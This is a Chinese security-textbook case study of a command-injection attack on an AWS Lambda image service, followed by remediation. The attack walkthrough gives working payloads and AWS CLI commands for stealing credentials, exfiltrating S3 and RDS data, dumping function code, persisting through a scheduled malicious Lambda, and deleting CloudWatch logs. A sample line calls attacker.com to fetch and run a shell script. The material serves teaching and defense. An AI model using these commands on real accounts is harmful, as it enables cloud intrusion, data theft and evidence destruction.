---
title: "案例五：Serverless函数漏洞利用——Lambda命令注入与横向渗透"
type: docs
weight: 5
---

## 12.3.5 案例五：Serverless函数漏洞利用

Serverless架构将基础设施管理完全委托给云厂商，开发者只需关注函数代码本身。这种"无服务器"范式在降低运维成本的同时，也引入了独特的安全攻击面——函数代码中的任何一个注入点，都可能成为攻击者进入整个云环境的跳板。本案例还原一次真实的AWS Lambda命令注入攻击链，从初始漏洞发现到凭据窃取、横向移动的完整过程，并系统性地剖析Serverless安全的防御体系。

### Serverless安全基础：为什么函数也是攻击面

在进入案例之前，有必要理解Serverless架构的安全模型，因为它与传统Web应用存在根本性差异。

#### Serverless架构与传统架构的安全差异

| 维度 | 传统服务器部署 | Serverless函数 |
|------|--------------|---------------|
| 运行环境 | 持久运行的操作系统实例 | 短暂的、按需启动的容器沙箱 |
| 网络暴露 | 持续监听端口，长期在线 | 仅在触发时运行，无常开端口 |
| 攻击面 | 操作系统+网络服务+应用代码 | 函数代码+事件源+运行时 |
| 凭据管理 | 实例角色/IAM长期有效 | 临时凭据，自动轮换（STS） |
| 横向移动 | 同VPC/子网内的其他实例 | 同账户下的其他服务和函数 |
| 日志审计 | 自建ELK/Splunk等 | 云平台原生日志（CloudWatch） |
| 责任边界 | 用户负责OS到应用全栈 | 云厂商负责运行时，用户负责代码+配置 |

```mermaid
graph TB
    subgraph "传统架构攻击面"
        A1[操作系统] --> A2[网络服务]
        A2 --> A3[Web框架]
        A3 --> A4[应用代码]
        A4 --> A5[数据库]
    end
    subgraph "Serverless攻击面"
        B1[事件源 API/S3/SQS] --> B2[函数代码]
        B2 --> B3[运行时 Node/Python]
        B3 --> B4[临时凭据 STS]
        B4 --> B5[云服务 S3/DynamoDB/Lambda]
    end
    style A4 fill:#ff6b6b,stroke:#c92a2a
    style B2 fill:#ff6b6b,stroke:#c92a2a
    style B4 fill:#ffa94d,stroke:#e67700
    style B5 fill:#ffa94d,stroke:#e67700
```

Serverless的关键安全特性在于**临时凭据机制**。每个Lambda函数在执行时，AWS STS（Security Token Service）会自动为其分配一组临时凭据（Access Key + Secret Key + Session Token），有效期通常为数小时。这组凭据的角色由函数的IAM执行角色决定。攻击者一旦获取这些凭据，就可以在有效期内以该角色的身份调用任何被授权的AWS API。

#### Lambda运行时环境深入理解

Lambda函数运行在一个经过安全加固的微型虚拟机（microVM，基于Firecracker技术）中。每个执行环境具有以下特征：

- **文件系统**：`/tmp`目录可写（最大10GB），其余为只读的Amazon Linux系统
- **环境变量**：函数配置中设置的键值对，包括可能包含的API密钥、数据库连接串等敏感信息
- **元数据服务**：通过`http://169.254.169.254`可访问实例元数据，但Lambda已使用IMDSv2且凭据直接注入环境变量
- **执行角色凭据**：通过环境变量`AWS_ACCESS_KEY_ID`、`AWS_SECRET_ACCESS_KEY`、`AWS_SESSION_TOKEN`注入
- **网络**：可选配置VPC（此时可访问VPC内资源）或在默认AWS网络中运行
- **进程空间**：函数代码以特定用户身份运行，`/proc/self/environ`中包含所有环境变量

理解这些环境特征对理解攻击链至关重要——攻击者一旦获得命令执行能力，就能读取上述所有信息。

### 案例背景：在线图片处理服务

某SaaS公司提供在线图片处理服务，用户通过REST API上传图片URL和处理参数，后端使用AWS Lambda函数执行图片缩放、裁剪、水印等操作。技术栈如下：

| 组件 | 技术选型 |
|------|---------|
| API网关 | AWS API Gateway（REST API） |
| 函数运行时 | Python 3.9 + ImageMagick |
| 存储 | S3（原始图片+处理结果） |
| 认证 | API Key（通过Header传递） |
| 日志 | CloudWatch Logs |
| 执行角色 | 与多个微服务共享的`ImageServiceRole` |

该服务日均处理请求约50万次，承载了多家企业客户的图片处理需求。攻击发生时，函数内存储了用于访问S3存储桶和调用其他Lambda函数的临时凭据。

### 攻击链完整还原

攻击链分为五个阶段，从发现命令注入漏洞到最终实现云账户级别的横向渗透。

#### 阶段一：漏洞发现——参数模糊测试

攻击者首先对图片处理API进行模糊测试（Fuzzing），通过向`width`参数注入特殊字符来探测后端处理逻辑。

**探测请求示例：**

```http
POST /api/resize HTTP/1.1
Host: api.example.com
Content-Type: application/json
X-Api-Key: legitimate_user_key

{
    "image_url": "https://example.com/photo.jpg",
    "width": "100; id"
}
```

**响应分析：**

```json
{
    "statusCode": 200,
    "body": "uid=999(sbx_user105) gid=999 groups=999\nconvert: no images defined..."
}
```

`body`字段中返回了`id`命令的输出（`uid=999(sbx_user105)`），证实了命令注入漏洞的存在。Lambda函数使用了沙箱用户（`sbx_user105`）执行代码，这是Lambda Execution Environment的标准行为。

**关键发现：**
- 后端直接将`width`参数拼接到shell命令中
- 命令输出直接返回给调用方（反射型命令注入）
- 函数以沙箱用户身份运行，但拥有完整的环境变量访问权限

#### 阶段二：环境侦察——读取Lambda运行时信息

确认漏洞后，攻击者开始系统性地收集Lambda环境信息。

**2.1 读取环境变量（获取临时凭据）**

```json
{"width": "100; env", "image_url": "x"}
```

返回的环境变量中包含关键信息：

```bash
AWS_REGION=us-east-1
AWS_LAMBDA_FUNCTION_NAME=image-resizer-prod
AWS_ACCESS_KEY_ID=ASIA...EXAMPLE
AWS_SECRET_ACCESS_KEY=wJalrXUtnFEMI/K7MDENG...EXAMPLE
AWS_SESSION_TOKEN=FwoGZXIvYXdzEBYaDHqa0...LONGTOKEN
IMAGE_BUCKET=prod-image-store-2024
DB_HOST=rds-prod-cluster.xxxxx.us-east-1.rds.amazonaws.com
DB_PASSWORD=SuperSecret123!
INTERNAL_API_KEY=sk-internal-abc123def456
```

这是整个攻击链的关键转折点。攻击者同时获得了：
- **AWS临时凭据**：可用于调用该角色被授权的所有AWS API
- **数据库密码**：RDS实例的直连凭据
- **内部API密钥**：可用于调用其他内部微服务

**2.2 系统信息收集**

```json
{"width": "100; cat /etc/os-release", "image_url": "x"}
```

确认运行环境为Amazon Linux 2，内核版本和系统包信息。这些信息有助于攻击者判断可用的系统工具和潜在的提权路径。

```json
{"width": "100; ls -la /var/task/", "image_url": "x"}
```

列出函数代码目录，可能发现配置文件、依赖目录结构，甚至硬编码的其他凭据。

#### 阶段三：凭据验证——确认权限范围

攻击者使用窃取的AWS临时凭据进行API调用，验证其权限范围。

**3.1 STS身份验证**

```bash
# 使用窃取的凭据配置AWS CLI
export AWS_ACCESS_KEY_ID="ASIA...EXAMPLE"
export AWS_SECRET_ACCESS_KEY="wJalrXUtnFEMI/K7MDENG...EXAMPLE"
export AWS_SESSION_TOKEN="FwoGZXIvYXdzEBYaDHqa0...LONGTOKEN"

# 调用GetCallerIdentity确认身份
aws sts get-caller-identity
```

```json
{
    "UserId": "AROA...EXAMPLE:image-resizer-prod",
    "Account": "123456789012",
    "Arn": "arn:aws:sts::123456789012:assumed-role/ImageServiceRole/image-resizer-prod"
}
```

确认了当前身份为`ImageServiceRole`角色，关联账户`123456789012`。

**3.2 枚举IAM权限**

```bash
# 使用iam-detector或手动枚举
aws iam list-attached-role-policies --role-name ImageServiceRole
aws iam list-role-policies --role-name ImageServiceRole
```

发现该角色被附加了以下策略：
- `AmazonS3FullAccess`（完整的S3读写权限）
- `AWSLambdaFullAccess`（完整的Lambda管理权限）
- `AmazonRDSFullAccess`（完整的RDS管理权限）
- 自定义策略`ImageServicePolicy`（包含CloudWatch Logs权限）

这是一个典型的**权限过度分配**问题——图片处理函数根本不需要RDS管理权限和Lambda管理权限。

#### 阶段四：横向移动——利用过度权限渗透

**4.1 S3数据泄露**

```bash
# 列出所有S3存储桶
aws s3 ls

# 遍历敏感存储桶
aws s3 ls s3://prod-image-store-2024/ --recursive | head -50
aws s3 ls s3://prod-user-uploads/ --recursive
aws s3 ls s3://prod-backup/ --recursive

# 批量下载敏感文件
aws s3 sync s3://prod-backup/ ./exfiltrated/ --exclude "*" --include "*.sql"
aws s3 sync s3://prod-user-uploads/ ./exfiltrated/users/
```

由于角色拥有`AmazonS3FullAccess`权限，攻击者可以访问账户下的所有存储桶，包括数据库备份、用户上传文件、配置备份等。

**4.2 数据库渗透**

利用环境变量中泄露的RDS连接信息：

```bash
# 通过Lambda函数间接连接RDS（函数在VPC内）
# 或直接使用泄露的DB密码从外部连接（如果RDS允许公网访问）
mysql -h rds-prod-cluster.xxxxx.us-east-1.rds.amazonaws.com \
      -u admin -p'SuperSecret123!' -D production

# 导出用户表
mysqldump -h rds-prod-cluster.xxxxx.us-east-1.rds.amazonaws.com \
          -u admin -p'SuperSecret123!' production users > users_dump.sql
```

**4.3 Lambda函数代码窃取**

```bash
# 列出所有Lambda函数
aws lambda list-functions --query 'Functions[].FunctionName' --output table

# 下载函数代码
aws lambda get-function --function-name payment-processor-prod --query 'Code.Location' --output text
curl -o payment-processor.zip "$(aws lambda get-function --function-name payment-processor-prod --query 'Code.Location' --output text)"

# 下载所有函数的环境变量
for func in $(aws lambda list-functions --query 'Functions[].FunctionName' --output text); do
    echo "=== $func ==="
    aws lambda get-function-configuration --function-name "$func" --query 'Environment.Variables' --output json
done
```

由于角色拥有`AWSLambdaFullAccess`权限，攻击者可以下载所有函数的源代码和环境变量，进一步扩大攻击面——可能发现更多硬编码凭据、API密钥和业务逻辑。

**4.4 椭圆攻击面扩大（使用内部API密钥）**

```bash
# 使用泄露的内部API密钥调用其他微服务
curl -H "Authorization: Bearer sk-internal-abc123def456" \
     https://internal-api.example.com/admin/users

curl -H "Authorization: Bearer sk-internal-abc123def456" \
     https://internal-api.example.com/admin/config
```

#### 阶段五：持久化与痕迹清除

高级攻击者会尝试在环境中建立持久化机制并清除攻击痕迹。

```bash
# 植入定时触发的恶意函数（利用LambdaFullAccess权限）
aws lambda create-function \
    --function-name backup-worker \
    --runtime python3.9 \
    --role arn:aws:iam::123456789012:role/ImageServiceRole \
    --handler lambda_function.lambda_handler \
    --zip-file fileb://malicious_payload.zip

# 创建CloudWatch定时规则（每小时执行）
aws events put-rule --name "hourly-backup" --schedule-expression "rate(1 hour)"
aws events put-targets --rule "hourly-backup" \
    --targets "Id"="1","Arn"="arn:aws:lambda:us-east-1:123456789012:function:backup-worker"

# 清除CloudWatch日志（覆盖痕迹）
aws logs delete-log-group --log-group-name "/aws/lambda/image-resizer-prod"
```

### 攻击影响评估

| 影响维度 | 具体损失 | 严重等级 |
|---------|---------|---------|
| 数据泄露 | 用户数据、数据库备份、函数源码 | 严重 |
| 凭据泄露 | AWS临时凭据、数据库密码、内部API密钥 | 严重 |
| 横向渗透 | S3存储桶、RDS数据库、所有Lambda函数 | 严重 |
| 持久化 | 恶意Lambda函数+定时触发器 | 高 |
| 业务中断 | 日志被清除，影响事件溯源 | 高 |
| 合规风险 | 违反GDPR/PCI-DSS数据保护要求 | 严重 |

估算攻击窗口：从首次注入到持久化完成约需**2-4小时**。由于Lambda函数日均处理50万请求，攻击者可在正常流量中隐藏恶意请求，极难被实时检测。

### 根因分析：五层防御全部失效

本案例不是单一漏洞导致的事故，而是五层防御机制的系统性失效：

**第一层：输入验证缺失**
```python
# 漏洞代码：直接拼接用户输入
cmd = f"convert {image_url} -resize {width}x{width} output.jpg"
result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
```

`shell=True`加上字符串拼接，是命令注入漏洞的典型模式。`width`参数未做任何校验，直接嵌入shell命令字符串。

**第二层：权限最小化失败**

`ImageServiceRole`被附加了`AmazonS3FullAccess`、`AWSLambdaFullAccess`、`AmazonRDSFullAccess`等通配符策略。一个图片处理函数不需要管理RDS实例或创建新Lambda函数的能力。这是IAM策略管理中最常见的反模式——为了"方便"而给予过宽的权限。

**第三层：秘密管理不当**

数据库密码、内部API密钥直接存储在Lambda环境变量中，而非使用AWS Secrets Manager或SSM Parameter Store（SecureString类型）。环境变量可以通过Lambda API直接读取（`GetFunctionConfiguration`），也可以通过命令注入的`env`命令获取。

**第四层：日志监控不足**

攻击者的探测请求（如`width: "100; id"`）在CloudWatch日志中留下了明确的痕迹，但缺乏：
- 对Lambda函数输出内容的异常检测
- 对执行角色API调用的行为基线分析
- 对敏感API（如`GetFunctionConfiguration`、`CreateFunction`）的实时告警

**第五层：网络隔离缺失**

Lambda函数未配置VPC，且RDS实例允许公网访问。如果Lambda在VPC内运行且RDS仅允许VPC内访问，即使凭据泄露，外部攻击者也无法直接连接数据库。

### 防御体系建设：从代码到架构的全面加固

#### 防御一：代码层——消除注入漏洞

**1.1 禁止shell=True，使用参数化执行**

```python
import subprocess
import json
import re
import os
import tempfile

def handler(event, context):
    body = json.loads(event['body'])
    width = body.get('width', '100')
    image_url = body.get('image_url', '')

    # 严格输入验证：宽度必须是1-10000的整数
    if not re.match(r'^[1-9]\d{0,4}$', width):
        return {'statusCode': 400, 'body': json.dumps({'error': 'Invalid width'})}

    # URL白名单验证
    allowed_domains = ['images.example.com', 'cdn.example.com']
    if not any(image_url.startswith(f'https://{d}/') for d in allowed_domains):
        return {'statusCode': 400, 'body': json.dumps({'error': 'Invalid image source'})}

    # 使用参数化列表而非字符串拼接
    output_path = os.path.join(tempfile.gettempdir(), f'output_{context.aws_request_id}.jpg')
    cmd = ['convert', image_url, '-resize', f'{width}x{width}', output_path]

    # 不使用shell=True，subprocess直接调用可执行文件
    result = subprocess.run(cmd, capture_output=True, text=True, timeout=30)

    if result.returncode != 0:
        return {'statusCode': 500, 'body': json.dumps({'error': 'Processing failed'})}

    # 读取并返回处理后的图片（通过S3而非stdout）
    s3_key = upload_to_s3(output_path)
    os.unlink(output_path)  # 清理临时文件

    return {
        'statusCode': 200,
        'body': json.dumps({'result_url': f'https://cdn.example.com/{s3_key}'})
    }
```

**1.2 使用Pillow替代ImageMagick子进程调用**

更安全的做法是完全避免子进程调用，使用Python原生的图像处理库：

```python
from PIL import Image
import io
import boto3

def handler(event, context):
    body = json.loads(event['body'])
    width = int(body['width'])  # 由API Gateway层面做类型约束
    image_url = body['image_url']

    # 下载图片到内存
    image_data = download_image(image_url)
    img = Image.open(io.BytesIO(image_data))

    # 使用Pillow原生API处理，无子进程调用
    img = img.resize((width, width), Image.LANCZOS)

    # 保存到内存缓冲区
    buffer = io.BytesIO()
    img.save(buffer, format='JPEG', quality=85)
    buffer.seek(0)

    # 上传到S3
    s3 = boto3.client('s3')
    key = f'processed/{context.aws_request_id}.jpg'
    s3.put_object(Bucket='prod-image-store-2024', Key=key, Body=buffer)

    return {'statusCode': 200, 'body': json.dumps({'key': key})}
```

使用Pillow等原生库完全消除了命令注入的可能性——没有任何shell命令被执行。

**1.3 使用Lambda Layers管理依赖**

```bash
# 创建包含Pillow的Lambda Layer
pip install Pillow -t python/lib/python3.9/site-packages/
zip -r pillow-layer.zip python/

# 发布Layer
aws lambda publish-layer-version \
    --layer-name pillow-runtime \
    --zip-file fileb://pillow-layer.zip \
    --compatible-runtimes python3.9
```

#### 防御二：权限层——实施最小权限原则

**2.1 精细化IAM策略**

```json
{
    "Version": "2012-10-17",
    "Statement": [
        {
            "Sid": "AllowCloudWatchLogs",
            "Effect": "Allow",
            "Action": [
                "logs:CreateLogGroup",
                "logs:CreateLogStream",
                "logs:PutLogEvents"
            ],
            "Resource": "arn:aws:logs:us-east-1:123456789012:log-group:/aws/lambda/image-resizer-prod:*"
        },
        {
            "Sid": "AllowS3ReadInput",
            "Effect": "Allow",
            "Action": "s3:GetObject",
            "Resource": "arn:aws:s3:::prod-image-input/*"
        },
        {
            "Sid": "AllowS3WriteOutput",
            "Effect": "Allow",
            "Action": "s3:PutObject",
            "Resource": "arn:aws:s3:::prod-image-output/*"
        },
        {
            "Sid": "DenyIAMAndLambdaAdmin",
            "Effect": "Deny",
            "Action": [
                "iam:*",
                "lambda:CreateFunction",
                "lambda:DeleteFunction",
                "lambda:UpdateFunctionCode",
                "lambda:UpdateFunctionConfiguration",
                "lambda:AddPermission",
                "rds:*"
            ],
            "Resource": "*"
        }
    ]
}
```

关键设计原则：
- **资源级限定**：S3权限仅限特定存储桶的特定路径
- **显式Deny**：对高危操作（IAM管理、Lambda创建/修改、RDS管理）添加显式拒绝
- **函数级隔离**：每个函数使用独立的IAM角色，避免共享角色

**2.2 使用AWS IAM Access Analyzer检测过度权限**

```bash
# 启用IAM Access Analyzer
aws accessanalyzer create-analyzer --analyzer-name account-analyzer --type ACCOUNT

# 查找具有外部访问的资源
aws accessanalyzer list-findings --analyzer-arn arn:aws:accessanalyzer:us-east-1:123456789012:analyzer/account-analyzer

# 分析特定角色的有效权限
aws iam simulate-principal-policy \
    --policy-source-arn arn:aws:iam::123456789012:role/ImageServiceRole \
    --action-names s3:GetObject lambda:CreateFunction rds:DescribeDBInstances
```

#### 防御三：秘密管理层——消除明文凭据

**3.1 使用AWS Secrets Manager**

```python
import boto3
import json

secrets_client = boto3.client('secretsmanager')

def get_db_credentials():
    """从Secrets Manager获取数据库凭据"""
    response = secrets_client.get_secret_value(SecretId='prod/image-service/db-creds')
    return json.loads(response['SecretString'])

def handler(event, context):
    # 凭据在运行时动态获取，不在环境变量中存储
    creds = get_db_credentials()
    conn = pymysql.connect(
        host=creds['host'],
        user=creds['username'],
        password=creds['password'],
        database=creds['dbname']
    )
    # ...
```

**3.2 使用SSM Parameter Store（SecureString）**

```python
import boto3

ssm = boto3.client('ssm')

def get_parameter(name):
    response = ssm.get_parameter(Name=name, WithDecryption=True)
    return response['Parameter']['Value']

# 使用
api_key = get_parameter('/prod/image-service/internal-api-key')
```

**3.3 环境变量审计脚本**

定期扫描所有Lambda函数的环境变量，检测可能包含的敏感信息：

```python
import boto3
import re

lambda_client = boto3.client('lambda')

SENSITIVE_PATTERNS = [
    r'(?i)(password|passwd|secret|token|api.?key|private.?key)\s*[:=]',
    r'[A-Za-z0-9+/]{40,}={0,2}',  # Base64编码的长字符串
    r'(?i)sk-[a-zA-Z0-9]{20,}',    # API Key模式
    r'(?i)(AKIA|ASIA)[A-Z0-9]{16}', # AWS Access Key模式
]

def audit_env_vars():
    paginator = lambda_client.get_paginator('list_functions')
    findings = []

    for page in paginator.paginate():
        for func in page['Functions']:
            env_vars = func.get('Environment', {}).get('Variables', {})
            for key, value in env_vars.items():
                for pattern in SENSITIVE_PATTERNS:
                    if re.search(pattern, f'{key}={value}'):
                        findings.append({
                            'function': func['FunctionName'],
                            'variable': key,
                            'pattern': pattern
                        })
                        break

    return findings
```

#### 防御四：监控层——建立检测告警

**4.1 CloudWatch异常检测告警**

```python
import boto3

cloudwatch = boto3.client('cloudwatch')
logs_client = boto3.client('logs')

def setup_monitoring():
    # 1. 对Lambda函数输出进行Metric Filter（检测命令注入痕迹）
    logs_client.put_metric_filter(
        logGroupName='/aws/lambda/image-resizer-prod',
        filterName='CommandInjectionDetection',
        filterPattern='?uid= ?gid= ?passwd ?/etc/ ?/proc/ ?env= ?AWS_SECRET',
        metricTransformations=[{
            'metricName': 'CommandInjectionAttempts',
            'metricNamespace': 'Security/Injection',
            'metricValue': '1'
        }]
    )

    # 2. 告警：检测到注入尝试时触发
    cloudwatch.put_metric_alarm(
        AlarmName='Lambda-CommandInjection-Detected',
        MetricName='CommandInjectionAttempts',
        Namespace='Security/Injection',
        Statistic='Sum',
        Period=60,
        EvaluationPeriods=1,
        Threshold=1,
        ComparisonOperator='GreaterThanOrEqualToThreshold',
        AlarmActions=['arn:aws:sns:us-east-1:123456789012:security-alerts'],
        TreatMissingData='notBreaching'
    )

    # 3. CloudTrail告警：敏感API调用
    cloudwatch.put_metric_alarm(
        AlarmName='Lambda-ExcessivePermission-Used',
        MetricName='LambdaAdminAPICalls',
        Namespace='Security/Lambda',
        Statistic='Sum',
        Period=300,
        EvaluationPeriods=1,
        Threshold=0,
        ComparisonOperator='GreaterThanThreshold',
        AlarmActions=['arn:aws:sns:us-east-1:123456789012:security-alerts']
    )
```

**4.2 GuardDuty增强检测**

```bash
# 启用GuardDuty（如果尚未启用）
aws guardduty create-detector --enable

# GuardDuty会自动检测以下行为：
# - Lambda函数调用异常的AWS API
# - 从Lambda函数到已知恶意IP的数据外传
# - IAM角色异常的API调用模式
# - 加密货币挖矿行为（容器内）
```

**4.3 Lambda函数行为基线**

使用AWS Config规则监控函数配置变更：

```json
{
    "ConfigRuleName": "lambda-function-security-config",
    "Source": {
        "Owner": "AWS",
        "SourceIdentifier": "LAMBDA_FUNCTION_SETTINGS_CHECK"
    },
    "InputParameters": {
        "runtimeVersion": "python3.9",
        "memorySize": "512"
    }
}
```

#### 防御五：网络层——纵深隔离

**5.1 VPC隔离**

```python
# CloudFormation/Terraform配置：Lambda在VPC内运行
# 如此Lambda只能访问VPC内的RDS，无法被外部直接访问

# Terraform示例
resource "aws_lambda_function" "image_resizer" {
    function_name = "image-resizer-prod"
    vpc_config {
        subnet_ids         = ["subnet-private-1", "subnet-private-2"]
        security_group_ids = ["sg-lambda-image"]
    }
    # ...
}
```

**5.2 Security Group最小化**

```bash
# Lambda函数的Security Group：仅允许出站到RDS和S3端点
aws ec2 create-security-group \
    --group-name lambda-image-sg \
    --description "Security group for image processing Lambda"

# 仅允许出站到RDS（MySQL端口）
aws ec2 authorize-security-group-egress \
    --group-id sg-xxxxx \
    --protocol tcp --port 3306 \
    --source-group sg-rds-xxxxx

# S3通过VPC Endpoint访问（不需要互联网网关）
aws ec2 create-vpc-endpoint \
    --vpc-id vpc-xxxxx \
    --service-name com.amazonaws.us-east-1.s3 \
    --route-table-ids rtb-xxxxx
```

**5.3 WAF防护API Gateway**

```bash
# 在API Gateway上启用WAF，阻断命令注入payload
aws wafv2 create-web-acl \
    --name api-gateway-protection \
    --scope REGIONAL \
    --default-action '{"Allow": {}}' \
    --rules '[
        {
            "Name": "AWSManagedRulesCommonRuleSet",
            "Priority": 1,
            "Statement": {
                "ManagedRuleGroupStatement": {
                    "VendorName": "AWS",
                    "Name": "AWSManagedRulesCommonRuleSet"
                }
            },
            "OverrideAction": {"None": {}},
            "VisibilityConfig": {
                "SampledRequestsEnabled": true,
                "CloudWatchMetricsEnabled": true,
                "MetricName": "CommonRuleSet"
            }
        }
    ]'
```

AWS WAF的`AWSManagedRulesCommonRuleSet`规则组包含针对命令注入（`OSCommands`规则）的检测，可在API Gateway层面拦截恶意请求，使其根本无法到达Lambda函数。

### Serverless安全检测工具链

| 工具 | 类型 | 检测能力 | 适用场景 |
|------|------|---------|---------|
| **Checkov** | SAST/IaC | Lambda函数代码+Terraform/CloudFormation模板安全检查 | CI/CD集成 |
| **Serverless Framework plugin: aws-iam-checker** | 插件 | 检测过度宽泛的IAM策略 | 部署前检查 |
| **Snyk** | SCA | 依赖库漏洞扫描 | 持续监控 |
| **AWS IAM Access Analyzer** | 平台 | 检测可被外部访问的资源 | 运行时 |
| **AWS GuardDuty** | 平台 | 异常API调用、恶意IP通信、凭据泄露 | 运行时 |
| **Prowler** | 审计 | AWS安全最佳实践合规检查 | 定期审计 |
| **Lambda Guard** | 专项 | Lambda函数安全配置审计 | 专项检查 |
| **ScoutSuite** | 多云 | 多云安全态势评估 | 综合审计 |

**Checkov扫描示例：**

```bash
# 安装Checkov
pip install checkov

# 扫描Lambda函数代码（Python）
checkov -d ./lambda_functions/ --framework python

# 扫描IaC模板
checkov -d ./infrastructure/ --framework terraform

# 常见检测结果示例：
# CKV_AWS_116: "Ensure that AWS Lambda function is configured for a Dead Letter Queue"
# CKV_AWS_117: "Ensure that AWS Lambda function is configured inside a VPC"
# CKV_AWS_173: "Check that encryption is enabled for Lambda function environment variables"
```

### Serverless安全渗透测试方法论

对于安全从业者，以下是针对Serverless应用的系统化渗透测试清单：

**第一步：信息收集**
- [ ] 识别API端点和触发器类型
- [ ] 确认运行时语言和框架
- [ ] 收集API文档和参数规范

**第二步：输入验证测试**
- [ ] 命令注入（`$()`, `` ` ``, `;`, `|`, `&&`）
- [ ] SQL注入（如果连接数据库）
- [ ] 路径遍历（`../`）
- [ ] SSRF（内部URL、`169.254.169.254`元数据地址）
- [ ] 事件注入（针对异步触发器的恶意payload）

**第三步：环境逃逸测试**
- [ ] 读取`/proc/self/environ`（环境变量）
- [ ] 读取`/tmp`目录中的临时文件
- [ ] 访问`http://169.254.169.254`元数据服务
- [ ] 尝试写入文件系统（持久化payload）

**第四步：凭据利用测试**
- [ ] 验证窃取的AWS凭据有效性
- [ ] 枚举IAM角色权限
- [ ] 测试横向移动到其他AWS服务

**第五步：持久化测试**
- [ ] 创建新的Lambda函数
- [ ] 修改现有函数代码
- [ ] 创建定时触发器
- [ ] 修改IAM信任策略

### 其他常见Serverless攻击向量

本案例聚焦于命令注入，但Serverless函数还面临以下攻击向量：

**事件注入（Event Injection）**

当Lambda由S3、SQS、SNS等事件源触发时，攻击者可能通过控制事件数据来注入恶意指令。例如，攻击者上传一个特殊构造的文件名到S3，当Lambda处理该文件名时触发注入：

```python
# 漏洞代码
def handler(event, context):
    filename = event['Records'][0]['s3']['object']['key']
    # 文件名中包含shell元字符
    os.system(f"process_file.sh {filename}")
    # 如：key为 "file; curl attacker.com/shell.sh | bash"
```

**SSRF攻击**

Lambda函数可能被诱导访问内部服务：

```python
# 漏洞代码
def handler(event, context):
    url = event['url']
    response = requests.get(url)  # 未限制目标URL
    # 攻击者传入 http://169.254.169.254/latest/meta-data/iam/security-credentials/
    return response.text
```

**依赖投毒（Dependency Poisoning）**

通过污染npm/PyPI/pip等包管理器的公共仓库，攻击者可以将恶意代码注入到Lambda函数的依赖链中。2021年的`ua-parser-js`事件就是一个典型案例——每周下载量超过700万的npm包被植入了加密货币挖矿程序。

**冷启动信息泄露**

Lambda冷启动时可能在日志中输出详细的初始化信息，包括加载的模块版本、环境检测结果等，为攻击者提供有价值的情报。

### 关键经验总结

1. **Serverless不等于无安全责任**：云厂商负责运行时基础设施的安全，但函数代码安全、IAM配置、秘密管理等仍由用户全权负责。OWASP Serverless Top 10明确指出，传统Web漏洞（注入、XSS、SSRF等）在Serverless环境中依然存在，且攻击面从单个应用扩展到了整个云账户。

2. **最小权限不是建议，而是生存法则**：本案例中，如果`ImageServiceRole`仅拥有`S3:PutObject`（写入输出桶）和`CloudWatch Logs`权限，即使存在命令注入漏洞，攻击者也无法横向移动到其他服务。权限最小化是阻断攻击链最有效的单点措施。

3. **消除子进程调用是最根本的防御**：使用原生库（如Pillow替代ImageMagick命令行）完全消除了命令注入的可能性。在Serverless环境中，应优先选择语言原生方案而非shell命令调用。

4. **秘密必须集中管理**：Secrets Manager和SSM Parameter Store提供了凭据轮换、访问审计、自动过期等能力。将敏感信息硬编码在环境变量中，本质上是将"钥匙"和"锁"放在了同一个盒子里。

5. **监控告警是最后一道防线**：WAF可以在入口拦截、IAM可以在执行时拒绝、但只有监控系统能让你知道"有人正在试图攻击你"。CloudWatch Metric Filter + GuardDuty + CloudTrail组合提供了从函数输出到API调用的全链路可见性。

6. **安全左移（Shift Left）**：将安全检查集成到CI/CD流水线中——Checkov检查IaC模板、Snyk扫描依赖漏洞、IAM策略自动化审查——在部署前就消除大部分安全隐患，而非等到生产环境被入侵后才亡羊补牢。
